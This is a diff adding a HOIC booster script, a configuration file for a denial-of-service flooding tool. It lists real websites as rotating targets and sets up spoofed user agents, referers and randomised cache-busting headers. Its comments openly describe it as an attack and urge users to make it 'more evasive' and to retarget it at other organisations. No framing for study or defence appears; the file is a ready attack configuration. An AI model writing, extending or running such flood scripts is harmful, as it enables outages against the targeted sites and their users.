@@ -1,0 +1,68 @@
+Dim useragents() as String
+Dim referers() as String
+dim randheaders() as string
+Dim randURLs() as string
+ 
+// populate rotating urls
+// IF YOU WANT TO IMPROVE THE ATTACK, ADD URLS BELONGING TO THIS DOMAIN OR RELATED SUBDOMAINS!!! PRO-TIP: You should create anew target and .HOIC file if u want to attack a different organization
+randURLs.Append "www.yahoo.com"
+randURLs.Append "www.wowinterface.com"
+randURLs.Append "http://cs62.adn.xicdn.net"
+randURLs.Append "www.fast.com"
+
+// rotate out url
+URL =  randURLs(RndNumber(0, randURLs.UBound))
+ 
+// EDIT THE FOLLOWING STRINGS TO MAKE YOUR OWN BOOST UNIQUE AND THEREFORE MORE EVASIVE!
+ 
+// populate list
+useragents.Append "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
+useragents.Append "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)"
+useragents.Append "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53"
+useragents.Append "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+
+// populate referer list
+referers.Append "http://www.yahoo.com/"
+referers.Append "http://cs62.adn.xicdn.net"
+referers.Append "http://wowinterface.com"
+referers.Append "https://fast.com"
+referers.Append URL
+referers.Append "http://cs62.adn.xicdn.net"
+referers.Append "http://wowinterface.com"
+referers.Append "https://fast.com"
+referers.Append "http://www.yahoo.com/"
+ 
+// Add random headers
+randheaders.Append "Cache-Control: no-cache"
+randheaders.Append "If-Modified-Since: Sat, 29 Oct 1994 11:59:59 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Sep 2002 10:34:27 GMT"
+randheaders.Append "If-Modified-Since: Mon, 12 Aug 2004 12:54:49 GMT"
+randheaders.Append "If-Modified-Since: Wed, 30 Jan 2000 01:21:09 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Aug 2006 08:49:15 GMT"
+randheaders.Append "If-Modified-Since: Fri, 20 Oct 2006 09:34:27 GMT"
+randheaders.Append "If-Modified-Since: Mon, 29 Oct 2001 05:17:09 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Apr 2003 12:54:49 GMT"
+randheaders.Append "If-Modified-Since: Sat, 18 Aug 2002 12:54:49 GMT"
+randheaders.Append "If-Modified-Since: Wed, 30 Jan 2000 01:21:09 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Aug 2009 08:49:15 GMT"
+randheaders.Append "If-Modified-Since: Fri, 20 Jun 2006 09:34:27 GMT"
+randheaders.Append "If-Modified-Since: Sun, 13 Oct 2007 11:59:59 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Aug 2003 12:54:49 GMT"
+randheaders.Append "If-Modified-Since: Wed, 30 Jan 2002 01:21:09 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Aug 2009 08:49:15 GMT"
+randheaders.Append "If-Modified-Since: Fri, 20 Oct 2008 09:34:27 GMT"
+randheaders.Append "If-Modified-Since: Mon, 29 Oct 2007 11:59:59 GMT"
+randheaders.Append "If-Modified-Since: Tue, 18 Aug 2001 12:54:49 GMT"
+ 
+Headers.Append "Keep-Alive: 115"
+Headers.Append "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+Headers.Append "Connection: keep-alive"
+ 
+// ------------------ DO NOT EDIT BELOW THIS LINE
+ 
+// generate random referer
+Headers.Append "Referer: " + referers(RndNumber(0, referers.UBound))
+// generate random user agent (DO NOT MODIFY THIS LINE)
+Headers.Append "User-Agent: " + useragents(RndNumber(0, useragents.UBound))
+// Generate random headers
+Headers.Append randheaders(RndNumber(0, randheaders.UBound))
